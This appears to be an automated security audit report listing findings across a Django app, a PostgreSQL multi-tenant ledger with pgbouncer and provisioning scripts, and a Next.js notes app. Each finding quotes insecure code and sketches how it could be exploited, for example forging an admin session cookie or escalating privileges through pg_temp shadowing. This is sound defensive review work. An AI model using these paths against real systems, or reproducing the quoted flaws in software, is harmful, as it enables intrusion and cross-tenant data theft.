Single deterministic request; no fragile conditions.

findings.title: Session and CSRF cookies are not marked Secure
findings.evidence: `SESSION_COOKIE_SECURE = False` (line 118) and `CSRF_COOKIE_SECURE = False` (line 119), justified by the comment stating that TLS terminates at a branch-office proxy and the last hop is plain HTTP. HttpOnly and SameSite=Lax are set correctly (lines 113-114), so this is a targeted downgrade rather than an unconfigured file.
findings.impact: The session and CSRF cookies are transmitted over plaintext on the internal hop, so anyone on that network path can capture a session and impersonate an agent.
findings.recommendation: Terminate TLS at the application servers (or run the last hop over mTLS) and set both flags to True; the plaintext hop is the defect the cookie flags are being loosened to accommodate.

triage.reason: These flags protect the session credential itself; disabling them is a weakened control, not an absent extra.
The stated mitigation -- proxy TLS -- explicitly does not cover the hop where the cookie travels in the clear.
Passive capture on the plaintext hop is reliably repeatable for an attacker positioned there.

findings.title: Admin delete permission granted unconditionally
findings.evidence: `def has_delete_permission(self, request, obj=None): return True` on the base class inherited by QueueAdmin, TicketAdmin, CommentAdmin and AttachmentAdmin. Overriding the method replaces Django's model-permission check entirely, so the `delete_ticket` / `delete_queue` permissions are no longer consulted. The class docstring only argues that get_queryset restricts *which* objects are visible -- which is true, and OrganizationAdmin does gate deletion on is_superuser (line 34), showing the distinction was understood elsewhere.
findings.impact: Any staff user with admin access to their organisation can delete tickets, queues, comments and attachments -- destroying the audit trail -- even when the permission model was configured to withhold delete rights from them.
findings.recommendation: Drop the override and let Django's permission framework decide, or gate it on a specific permission/role rather than returning True.

triage.reason: This overrides an existing authorization check rather than omitting a hardening measure.
The permission decision is made in this method; no caller misuse is required.

Exploitability depends on the deployment's staff/permission assignments, which are not in the snapshot -- hence probable rather than confirmed, and low severity given it requires an existing staff account.

findings.title: SECURITY DEFINER function post_journal has no fixed search_path
findings.evidence: post_journal is declared SECURITY DEFINER (line 35) and owned by ledger_owner (line 111), but unlike its two neighbours it carries no `SET search_path` clause -- current_tenant sets it (002_rls.sql:24) and archive_account sets it (line 84). Inside the body it resolves `journals`, `entries`, `audit_log` and `jsonb_array_elements` unqualified (lines 56, 60, 66, 68). EXECUTE on it is granted to ledger_app (004_grants.sql:27), and pg_temp is always creatable by any session, so the caller controls how those unqualified names resolve.
findings.impact: ledger_app can pre-create shadowing objects (for example a pg_temp function or relation matching an unqualified name), call post_journal, and have its own code run as ledger_owner -- the schema owner. That is a privilege escalation out of the RLS-constrained application role and defeats the tenant isolation the whole 002_rls.sql design rests on.
findings.recommendation: Add `SET search_path = ledger, pg_temp` to post_journal exactly as archive_account has it, and schema-qualify every reference in the body.

triage.reason: Attacker control is the caller's own session search_path and pg_temp namespace; the untrusted writer is the ledger_app role that 001_schema.sql:7-9 describes as the API's login role.
The mitigation exists in this very file for the sibling function, which is what makes its absence here decisive rather than speculative.
Not linting: the PostgreSQL documentation names an unqualified SECURITY DEFINER body as the specific exploitable pattern.

findings.title: Tenant isolation depends on a session GUC while the pooler runs in transaction mode
findings.evidence: Every RLS policy in 002_rls.sql resolves through `ledger.current_tenant()`, which reads `current_setting('app.tenant_id')` -- session state. pgbouncer.ini sets `pool_mode = transaction` (line 18), so a server connection is returned to the pool at each transaction boundary and handed to a different client. `server_reset_query = DISCARD ALL` (line 19) does not close the gap: pgbouncer skips server_reset_query in transaction pooling unless server_reset_query_always is enabled, and that setting is absent from this file. The in-file comment asserts the app re-applies app.tenant_id on checkout, but the pooler gives the application no checkout hook to hang that on.
findings.impact: A tenant setting left on a pooled connection can persist into another tenant's transaction: if the next client does not set app.tenant_id inside its own transaction, its statements execute under the previous tenant's identity and RLS returns the wrong tenant's ledger rows. The failure is silent and reads as correct data.
findings.recommendation: Set the value with `SET LOCAL app.tenant_id` inside each transaction (transaction-scoped, discarded at commit), and add `server_reset_query_always = 1` as a belt-and-braces measure. Verify by asserting current_tenant() at the start of every transaction.

triage.reason: The two apparent mitigations were checked and neither holds: DISCARD ALL is not executed in transaction pooling by default, and the 'app re-applies on checkout' claim has no mechanism in a transaction pooler.
Whether the leak is reachable depends on whether the API issues SET or SET LOCAL, and the API code is not part of this directory -- so this is reported as probable, not confirmed.
Deployment/architecture defect rather than a tainted data flow to a sink.

findings.title: Database credential file written world-readable
findings.evidence: `chmod 0644 "${CONFIG_DIR}/db.env"` on the file written at lines 59-65, which contains LEDGER_DB_PASSWORD fetched from Vault. The comment explains that three consumers do not share a group. The same script demonstrates the correct handling twelve lines later for the pgbouncer userlist (umask 0177 plus chown, lines 101-107), so the loose mode is a deliberate departure.
findings.impact: Every local account and every process on the host can read the ledger application's database password, defeating the point of fetching it from a secret store.
findings.recommendation: Create a shared group for the three consumers and use `install -m 0640 -g ledger-svc`, or hand each consumer its own credential.

triage.reason: Filesystem permissions on a live credential are the access control here, not a defence-in-depth extra.
provision.sh is the deployment script referenced by the file's own header, not a sample.
Trivially reproducible: any unprivileged local reader can cat the file.

findings.title: Export directory made world-writable recursively
findings.evidence: `chmod -R 0777 "$EXPORT_DIR"` on /srv/ledger/exports, described in the preceding comment as holding the statement bundles the API writes and the reporting sidecar, archiver and ops jobs read back.
findings.impact: Any local account can read every tenant's financial statement bundle and, because the mode is writable, replace a bundle before a downstream job consumes it -- an integrity attack on reported figures, not just a disclosure.
findings.recommendation: Give the producers and consumers a shared group and use `chgrp -R ledger-svc` with mode 2770 (setgid) so new files inherit the group.

triage.reason: 0777 on a data directory is an affirmative grant of write access to everyone, not a missing hardening step.
The chmod is executed unconditionally by the script itself.
Deterministic and repeatable by any local user.

findings.title: Out-of-band migrations fetched over plaintext HTTP and applied as the schema owner
findings.evidence: `MIGRATION_MIRROR="http://artifacts.internal.example/ledger/migrations"` (line 17) is fetched with `curl -fsSL` (line 48, -L follows redirects), unpacked with tar (line 49), and every resulting *.sql is executed with `psql -U ledger_owner` under ON_ERROR_STOP (lines 82-86). There is no signature, checksum or pinning of any kind, and the transport is plaintext.
findings.impact: Anyone able to intercept or spoof that internal HTTP endpoint -- ARP/DNS position, a compromised mirror, or a redirect to a host they control -- executes arbitrary SQL as the ledger schema owner: disable RLS, add policies, exfiltrate every tenant's ledger, or install a backdoor function.
findings.recommendation: Serve the mirror over HTTPS with certificate verification, verify a detached signature or a pinned SHA-256 of the tarball before extraction, and extract to a scratch directory with tar's path-traversal protections.

triage.reason: The untrusted writer is whoever answers the plaintext URL at line 48; the tainted content flows to psql execution at line 85.
`set -euo pipefail` and ON_ERROR_STOP make the script fail loudly on errors but do nothing to authenticate the payload.
Deployment path, invoked per the script header from the deploy host.

findings.title: post_journal does not verify the referenced accounts belong to the caller's tenant
findings.evidence: Line 63 takes `(line ->> 'account_id')::bigint` from the caller-supplied JSON and inserts it into ledger.entries with no check that the account row has tenant_id = v_tenant. Because the function is SECURITY DEFINER (line 35) it runs as ledger_owner, so the accounts_read policy that would normally hide other tenants' accounts is not consulted; only the FK to ledger.accounts is enforced. archive_account, by contrast, does constrain on tenant_id (line 93).
findings.impact: A tenant can post ledger entries that reference another tenant's account id. The rows are stamped with the attacker's tenant_id, so RLS still hides them from the victim, but the victim's account now carries entries it never authorised -- a cross-tenant integrity defect in a financial ledger, and a probe for the existence of another tenant's account ids.
findings.recommendation: Validate the account ids inside the function: join the incoming lines against ledger.accounts filtered on tenant_id = v_tenant and raise if any line does not resolve.

triage.reason: Ingress is the p_lines jsonb argument supplied by the API caller and consumed at line 63.
The missing check is inside the definer function that is the trust boundary; it does not rely on a caller misbehaving.
Full impact depends on whether the API layer pre-validates account ownership before calling, which is outside this directory -- reported as probable.

findings.title: Session cookie is unsigned base64 JSON and is trusted verbatim
findings.evidence: readSession base64url-decodes the nw_session cookie, JSON.parses it and returns userId, workspaceId and role with no MAC, signature or server-side lookup; writeSession (line 50) is the symmetric encoder and is equally unauthenticated. The only checks are presence of three fields and an age comparison against `parsed.issuedAt` -- a value inside the same attacker-controlled blob. The doc comment argues httpOnly keeps page scripts away from it, which addresses theft, not forgery.
findings.impact: Anyone can craft `nw_session` = base64url(JSON) naming any userId, any workspaceId and role 'admin'. That is complete authentication and authorization bypass across every workspace, and it satisfies the middleware gate, the server actions and the share endpoint alike.
findings.recommendation: Sign the payload (HMAC over the JSON with a server key, verified before parsing) or, better, store an opaque random session id server-side and look it up. Derive expiry from the server record, never from the cookie.

triage.reason: Ingress cited at both consumers: notes-workspace/middleware.ts:27 and notes-workspace/app/actions/notes.ts:22 read the cookie value straight into readSession.
The two apparent controls were evaluated and neither authenticates the cookie: httpOnly limits script access, and the MAX_AGE_MS check reads its timestamp from the forged payload itself.
This is not a demand for extra paranoia around a safe library -- there is no integrity primitive in the path at all.

findings.title: Middleware reflects any Origin and allows credentials
findings.evidence: `res.headers.set('Access-Control-Allow-Origin', origin)` with `Access-Control-Allow-Credentials: true` on the next line, for whatever Origin the request carried, applied before the auth check and to every path the matcher covers (line 45: everything except /api, _next static and the favicon). The comment states the intent: hand back whichever origin asked.
findings.impact: Any site a signed-in user visits can read authenticated workspace responses cross-origin -- note pages and the server-action responses they render -- because the browser is told the arbitrary origin is allowed and credentials may ride along.
findings.recommendation: Compare the Origin against an allowlist of the desktop app, extension and marketing origins, and echo it only on a match; never reflect unconditionally when credentials are enabled.

triage.reason: This is a granted cross-origin read permission, not a missing security header; next.config.mjs already sets the hygiene headers separately (lines 24-28).

The serverActions.allowedOrigins setting in next.config.mjs:9 is a real control and was credited -- it constrains Server Action invocation but does not undo the ACAO/ACAC pair emitted here for ordinary responses.
Configuration/response-header weakness rather than a tainted data flow.

findings.title: updateNoteAction writes any note by id without an ownership check
findings.evidence: Line 58 calls `currentSession()` and discards the result -- it only asserts that someone is signed in. The note is then fetched by raw id (line 66) and overwritten (line 72) with no comparison against session.workspaceId. The neighbouring actions do scope correctly: createNoteAction passes session.workspaceId (line 46) and recentNotes passes it to listNotes (line 35), so the omission is specific to the update path. saveNote itself (lib/db.ts:46) filters only on the note id.
findings.impact: Any signed-in user can overwrite the title, source and rendered html of any note in any workspace by supplying its uuid -- silent cross-tenant tampering, and a stored-content vector into other workspaces' pages.
findings.recommendation: Keep the session, and either scope the UPDATE (`WHERE id = $1 AND workspace_id = $2`) or verify `existing.workspace_id === session.workspaceId` before saving.

triage.reason: Ingress cited: the id field of the form payload is parsed at notes-workspace/app/actions/notes.ts:61 and used as the sole selector at line 72.
The zod schema at line 12 validates that the id is a uuid, which is a format check and not an authorization control.
The server action is itself the boundary; nothing depends on a caller passing bad parameters by mistake.

findings.title: Note page renders any note by id regardless of workspace
findings.evidence: `const note = await getNote(params.id)` with no session read and no workspace comparison; generateMetadata (line 10) does the same and leaks the title even when the body is not rendered. lib/db.ts getNote (line 20) selects on id alone. The middleware only establishes that some session cookie parsed (middleware.ts:27-35) -- it does not scope the object.
findings.impact: Any signed-in user who learns or guesses a note uuid reads that note's full rendered content from another workspace. Combined with the forgeable session cookie, no legitimate account is even required.
findings.recommendation: Read the session in the page, and fetch with `getNote(id, session.workspaceId)` backed by a query that filters on workspace_id.

triage.reason: Ingress cited: the [id] route parameter reaches the unscoped query at notes-workspace/app/notes/[id]/page.tsx:16.
The middleware gate was examined and only proves a session exists; it performs no per-object authorization.
code_paths narrowed to the page's own unscoped fetch; lib/db.ts is cited as evidence rather than listed as a flawed location.

findings.title: Share endpoint requires no authentication and no ownership check
findings.evidence: The handler validates the target and then fetches `getNote(body.noteId)` (line 30) without ever requiring a session: readSession is called only at line 36 and its result is used solely for attribution (`session?.userId ?? 'unknown'`, line 49). The route is additionally outside the middleware's matcher, which excludes `api` (middleware.ts:45), so nothing upstream authenticates it either. No check ties the note to the caller's workspace.
findings.impact: An unauthenticated attacker who knows or guesses a note uuid causes the server to POST that note's title and rendered html to one of the configured integration hosts, exfiltrating private content to a destination the attacker chooses among them, and writing a note_shares row attributed to 'unknown'.
findings.recommendation: Require a valid session at the top of the handler and verify the note's workspace matches it before fetching or forwarding.

triage.reason: Ingress cited: noteId and target come from the unauthenticated JSON request body parsed at notes-workspace/app/api/share/route.ts:20.

The share-target allowlist in lib/policy.ts is a working mitigation and is credited -- it blocks SSRF, which is why SSRF is not claimed here. The missing authentication is a separate, unmitigated flaw and not an invented adjacent class.
Absent authentication on a data-forwarding endpoint is not the local-only test surface rule 02 excuses.

findings.title: Legacy session verifier uses an MD5 secret-prefix construction
findings.evidence: `createHash('md5').update(salt + payload).digest('hex')` compared with `expected === digest` (line 69). Two defects beyond MD5's collision weakness: a secret-prefix hash is not a MAC and is length-extension extendable, and the comparison is not constant time. The doc comment states no caller in the app reads it, but names a backfill script in another repository that still does.
findings.impact: Any consumer still validating this format can be handed a forged payload once the construction is attacked, yielding a session identity of the attacker's choosing.
findings.recommendation: Replace with createHmac('sha256', key) and timingSafeEqual, or retire the format and the backfill script together.

triage.reason: Rule 08 keeps it: MD5 in a session-verification construction is intrinsically broken and stays valid with no live caller in this snapshot.
Production library file, not a test path -- but the only stated consumer lives outside this repository, so the critic stage could not confirm production reachability and the status is probable.
Reproducibility depends on the out-of-repo backfill script that the comment says still uses it.
